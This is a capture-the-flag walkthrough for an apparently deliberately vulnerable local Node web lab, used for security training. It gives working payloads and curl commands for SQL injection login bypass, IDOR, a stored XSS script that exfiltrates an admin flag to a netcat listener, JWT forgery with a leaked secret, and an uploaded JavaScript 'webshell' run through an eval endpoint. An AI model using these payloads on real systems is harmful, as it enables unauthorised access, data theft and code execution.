# walkthrough.md

> ?? These instructions are for controlled lab validation only. Do not use the techniques outside the sandbox.

## 0. Environment Prep
- Install dependencies and seed the DB (`npm install && npm run init-db`) or run `docker compose up --build`.
- All examples assume the app listens on `http://localhost:3000`.
- Use a fresh terminal for `curl` commands and keep cookies in `cookies.txt` so we can reuse sessions.

## 1. Easy Flag (`THM{flag_easy_2025}`)
```bash
curl http://localhost:3000/public/flag_easy.txt
```

**Burp tip:** Proxy a simple GET request to `/public/flag_easy.txt` and view the raw response body.

## 2. SQL Injection ? Alice secret note (`THM{flag_sql_2025}`)
1. Exploit the `POST /login` query by commenting out the password check:
   ```bash
   curl -i -c cookies.txt -X POST http://localhost:3000/login \
     -d "username=alice' -- " \
     -d "password=ignored"
   ```
   The response sets a session cookie even though the password was wrong.
2. Visit the homepage with the stolen session and read the secret note exposed for the logged-in user:
   ```bash
   curl -b cookies.txt http://localhost:3000/
   ```
   Look for `THM{flag_sql_2025}` in the HTML.

**Burp alternative:**
- Intercept the login POST, change the username field to `alice' -- `, forward the request, and then load `/` while replaying the issued cookie via Burp's Repeater to confirm the flag appears.

## 3. IDOR on Orders (`THM{flag_idor_2025}`)
With the same low-privilege cookie from step 2:
```bash
curl -b cookies.txt http://localhost:3000/orders/2
```
The response echoes Bob's confidential order containing `THM{flag_idor_2025}`.

**Burp tip:** Send `/orders/1` to Repeater, duplicate the tab, change the path to `/orders/2`, and observe the flag in the response while still using Alice's cookie.

## 4. Stored XSS ? Admin flag (`THM{flag_xss_2025}`)
1. Start a simple listener to capture the exfiltrated flag (choose one):
   ```bash
   # Option A: Python
   python3 -m http.server 9000
   # Option B: Netcat
   nc -lv 9000
   ```
2. Post a malicious comment that steals the hidden admin flag when an admin views `/admin/messages`:
   ```bash
   curl -b cookies.txt -X POST http://localhost:3000/comments \
     --data-urlencode "content=<script>fetch('http://127.0.0.1:9000/?flag=' + encodeURIComponent(document.getElementById('admin-flag').innerText))</script>"
   ```
3. In a separate browser (or new cookie jar), log in as the real admin (`admin/adminpass`) and visit `http://localhost:3000/admin/messages` to trigger the payload.
4. Watch the listener output; you should see the request containing `THM{flag_xss_2025}` in the query string.

**Burp note:** You can replay the stored payload from step 2 via Burp's Repeater to confirm it persists, then browse `/admin/messages` with a valid admin cookie to execute it.

## 5. RCE Chain ? Admin secret (`THM{flag_admin_2025}`)
We demonstrate both token forgery and the upload->exec vector.

### 5a. Leak `JWT_SECRET` and forge an admin cookie
1. Abuse the config leak:
   ```bash
   curl -b cookies.txt "http://localhost:3000/config?debug=1"
   ```
   Note `JWT_SECRET` (default `THIS_IS_SECRET_FOR_LAB`).
2. Forge an admin JWT using Node.
   - **Bash / zsh:**
     ```bash
     TOKEN=$(node -e "console.log(require('jsonwebtoken').sign({id:3, username:'admin', role:'admin'}, 'THIS_IS_SECRET_FOR_LAB'))")
     echo $TOKEN
     ```
   - **PowerShell:**
     ```powershell
     $TOKEN = node -e "console.log(require('jsonwebtoken').sign({id:3, username:'admin', role:'admin'}, 'THIS_IS_SECRET_FOR_LAB'))"
     $TOKEN = $TOKEN.Trim()
     $TOKEN
     ```
3. Use the forged cookie to grab the final flag:
   ```bash
   curl -H "Cookie: token=$TOKEN" http://localhost:3000/admin/secret.txt
   ```
   The body returns `THM{flag_admin_2025}`.

### 5b. Insecure upload + `eval` execution
1. Craft a JavaScript payload that reads the secret file.
   - **Bash / zsh:**
     ```bash
     cat <<'EOF' > webshell.js
     (() => {
       const fs = require('fs');
       return fs.readFileSync('admin/secret.txt', 'utf8');
     })()
     EOF
     ```
   - **PowerShell:**
     ```powershell
     @'
     (() => {
       const fs = require('fs');
       return fs.readFileSync('admin/secret.txt', 'utf8');
     })()
     '@ | Set-Content -Path webshell.js
     ```
2. Upload it while authenticated as any user (Alice session works):
   ```bash
   curl -b cookies.txt -F "file=@webshell.js" http://localhost:3000/upload
   ```
3. Execute the uploaded payload via the lab-only endpoint:
   ```bash
   curl -b cookies.txt "http://localhost:3000/uploads/exec?file=webshell.js"
   ```
   The response prints the flag.

**Burp tip:** Use the Proxy to capture an upload request, swap the payload for the RCE shell, then invoke `/uploads/exec` with Burp Repeater to observe the response.

## Cleanup
- Delete `cookies.txt`, uploaded payloads in `public/uploads/`, and rerun `npm run init-db` for a fresh lab instance.
- Stop any helper listeners you started (Python HTTP server or netcat).
